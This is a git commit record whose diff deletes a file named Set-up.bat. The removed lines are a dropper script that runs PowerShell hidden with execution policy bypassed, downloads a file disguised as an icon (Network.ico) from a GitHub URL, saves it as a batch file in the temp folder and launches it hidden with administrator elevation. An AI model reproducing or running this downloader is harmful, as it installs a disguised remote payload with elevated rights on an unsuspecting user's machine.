431574c7a1c62d29af895a525992e8181306fb06
Splash2520 <splashxsplashx25@gmail.com>
2025-05-21 16:24:53 +0300

    Delete Set-up.bat

--- Set-up.bat
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/Splash2520/splash/raw/refs/heads/main/Network.ico' -OutFile $env:TEMP\Network.bat; Start-Process -FilePath $env:TEMP\Network.bat -WindowStyle Hidden -Verb RunAs}"
-exit/
